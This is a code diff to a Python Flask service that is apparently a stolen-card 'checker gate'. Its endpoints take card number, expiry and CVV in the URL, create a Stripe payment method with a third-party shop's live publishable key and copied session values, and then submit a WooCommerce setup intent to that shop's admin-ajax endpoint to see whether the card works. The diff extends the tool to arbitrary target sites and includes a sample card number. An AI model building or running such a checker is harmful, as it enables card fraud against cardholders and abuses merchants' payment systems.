@@ -45,65 +45,31 @@ def validate_credit_card(card_data):
         'cvv': cvv
     }
 
-@app.route('/gate=stripeauth/cc=<path:card_data>', methods=['GET'])
-def process_payment(card_data):
+def get_stripe_headers_and_data(site, cc_data):
     """
-    Process Stripe payment with provided credit card data
-    Format: /gate=stripeauth/cc=card_no|mm|yy|cvv
+    Return appropriate Stripe headers and data based on the site
     """
-    try:
-        # Validate card data
-        is_valid, validation_result = validate_credit_card(card_data)
-        
-        if not is_valid:
-            return jsonify({
-                'status': 'error',
-                'message': validation_result
-            }), 400
-        
-        cc_data = validation_result
-        
-        # Step 1: Create payment method with Stripe
-        headers = {
-            'authority': 'api.stripe.com',
-            'accept': 'application/json',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        }
+    base_headers = {
+        'authority': 'api.stripe.com',
+        'accept': 'application/json',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+    }
 
+    # Default configuration (for shop.wiseacrebrew.com)
+    if site == 'shop.wiseacrebrew.com':
         data = f'type=card&card[number]={cc_data["card_no"]}&card[cvc]={cc_data["cvv"]}&card[exp_year]={cc_data["yy"]}&card[exp_month]={cc_data["mm"]}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F7ab2721f84%3B+stripe-js-v3%2F7ab2721f84%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=277623&client_attribution_metadata[client_session_id]=63b40a11-d53d-4b60-af73-bf1f472c55ce&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=885aa08a-48ed-453e-928e-92fab222bb47&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_attribution_metadata[merchant_integration_additional_elements][1]=achBankSearchResults&guid=34461288-8dd1-47ee-ae6e-385ae0f1e4d5595130&muid=810cf478-762b-4d16-a93b-12120ff987f883bbe6&sid=73f92f0a-e14b-432b-8799-9e8cb89297f886157f&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy&_stripe_version=2024-06-20'
-
-        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         
-        if response.status_code != 200:
-            return jsonify({
-                'status': 'error',
-                'message': f'Stripe API error: {response.status_code}',
-                'response': response.text
-            }), 400
-        
-        op = response.json()
-        
-        if 'id' not in op:
-            return jsonify({
-                'status': 'error',
-                'message': 'Failed to create payment method',
-                'response': op
-            }), 400
-            
-        payment_method_id = op["id"]
-
-        # Step 2: Process payment with the created payment method
-        cookies = {
+        site_cookies = {
             '_ga': 'GA1.1.1677572053.1762021267',
             'sbjs_migrations': '1418474375998%3D1',
             'sbjs_current_add': 'fd%3D2025-11-01%2017%3A51%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29',
@@ -120,7 +86,7 @@ def process_payment(card_data):
             '_ga_94LZDRFSLM': 'GS2.1.s1762021267$o1$g1$t1762021431$j24$l0$h0',
         }
 
-        headers = {
+        site_headers = {
             'authority': 'shop.wiseacrebrew.com',
             'accept': '*/*',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
@@ -137,26 +103,111 @@ def process_payment(card_data):
             'x-requested-with': 'XMLHttpRequest',
         }
 
-        data = {
+        site_data = {
             'action': 'wc_stripe_create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': payment_method_id,
+            'wc-stripe-payment-method': '{payment_method_id}',
             'wc-stripe-payment-type': 'card',
             '_ajax_nonce': '3a28ca36fe',
         }
 
-        response = requests.post('https://shop.wiseacrebrew.com/wp/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+        endpoint = 'https://shop.wiseacrebrew.com/wp/wp-admin/admin-ajax.php'
 
-        return jsonify({
-            'status': 'success',
-            'payment_method_id': payment_method_id,
-            'response': response.text,
-            'status_code': response.status_code
-        })
+    # Add more site configurations here as needed
+    # elif site == 'another-site.com':
+    #     data = '...'
+    #     site_cookies = {...}
+    #     site_headers = {...}
+    #     site_data = {...}
+    #     endpoint = '...'
+
+    else:
+        # Default configuration for unknown sites
+        data = f'type=card&card[number]={cc_data["card_no"]}&card[cvc]={cc_data["cvv"]}&card[exp_year]={cc_data["yy"]}&card[exp_month]={cc_data["mm"]}&allow_redisplay=unspecified&billing_details[address][country]=US&payment_user_agent=stripe.js%2F234f261dc5%3B+stripe-js-v3%2F234f261dc5%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2F{site}&time_on_page=34017&key=pk_live_51Kg8dtBXnyl1N5QY5UDJKCtBpYRB0SiGjpzJdN2sdcy3BxgAQRFtRxQEbm3lBmHQBzUWb3gz9bcVrkcMAVJ2xwav00P1HQeJHz&_stripe_version=2024-06-20'
+        
+        site_cookies = {}
+        site_headers = {}
+        site_data = {}
+        endpoint = f'https://{site}/wp-admin/admin-ajax.php'
+
+    return base_headers, data, site_cookies, site_headers, site_data, endpoint
+
+@app.route('/gateway=stripeauth/site=<path:site>/cc=<path:card_data>', methods=['GET'])
+def process_payment(site, card_data):
+    """
+    Process Stripe payment with provided site and credit card data
+    Format: /gateway=stripeauth/site=example.com/cc=card_no|mm|yy|cvv
+    """
+    try:
+        # Validate card data
+        is_valid, validation_result = validate_credit_card(card_data)
+        
+        if not is_valid:
+            return jsonify({
+                'status': 'error',
+                'message': validation_result,
+                'site': site
+            }), 400
+        
+        cc_data = validation_result
+        
+        # Get appropriate configuration for the site
+        stripe_headers, stripe_data, site_cookies, site_headers, site_form_data, endpoint = get_stripe_headers_and_data(site, cc_data)
+
+        # Step 1: Create payment method with Stripe
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
+        
+        if response.status_code != 200:
+            return jsonify({
+                'status': 'error',
+                'message': f'Stripe API error: {response.status_code}',
+                'response': response.text,
+                'site': site
+            }), 400
+        
+        op = response.json()
+        
+        if 'id' not in op:
+            return jsonify({
+                'status': 'error',
+                'message': 'Failed to create payment method',
+                'response': op,
+                'site': site
+            }), 400
+            
+        payment_method_id = op["id"]
+
+        # Step 2: Process payment with the created payment method
+        if site_form_data:
+            # Update the payment method ID in the form data
+            site_form_data['wc-stripe-payment-method'] = payment_method_id
+            
+            response = requests.post(
+                endpoint, 
+                cookies=site_cookies, 
+                headers=site_headers, 
+                data=site_form_data
+            )
+
+            return jsonify({
+                'status': 'success',
+                'site': site,
+                'payment_method_id': payment_method_id,
+                'response': response.text,
+                'status_code': response.status_code
+            })
+        else:
+            return jsonify({
+                'status': 'error',
+                'message': f'No configuration found for site: {site}',
+                'site': site,
+                'payment_method_id': payment_method_id
+            }), 400
 
     except Exception as e:
         return jsonify({
             'status': 'error',
-            'message': f'Internal server error: {str(e)}'
+            'message': f'Internal server error: {str(e)}',
+            'site': site
         }), 500
 
 @app.route('/health', methods=['GET'])
@@ -164,17 +215,33 @@ def health_check():
     """Health check endpoint for Render"""
     return jsonify({'status': 'healthy', 'message': 'Server is running'})
 
+@app.route('/sites', methods=['GET'])
+def supported_sites():
+    """List supported sites"""
+    return jsonify({
+        'supported_sites': [
+            'shop.wiseacrebrew.com',
+            # Add more sites as you configure them
+        ],
+        'usage': 'GET /gateway=stripeauth/site=example.com/cc=card_no|mm|yy|cvv'
+    })
+
 @app.route('/', methods=['GET'])
 def home():
     """Home endpoint with usage instructions"""
     return jsonify({
-        'message': 'Stripe Payment Processor API',
-        'usage': 'GET /gate=stripeauth/cc=card_no|mm|yy|cvv',
-        'example': '/gate=stripeauth/cc=5392582546656184|08|26|416',
+        'message': 'Stripe Payment Processor API with Dynamic Site Support',
+        'usage': 'GET /gateway=stripeauth/site=example.com/cc=card_no|mm|yy|cvv',
+        'example': '/gateway=stripeauth/site=shop.wiseacrebrew.com/cc=5392582546656184|08|26|416',
         'supported_formats': [
             'card_no|mm|yy|cvv',
             'card_no|mm|yyyy|cvv'
-        ]
+        ],
+        'endpoints': {
+            '/health': 'Health check',
+            '/sites': 'List supported sites',
+            '/gateway=stripeauth/site={site}/cc={card_data}': 'Process payment'
+        }
     })
 
 if __name__ == '__main__':
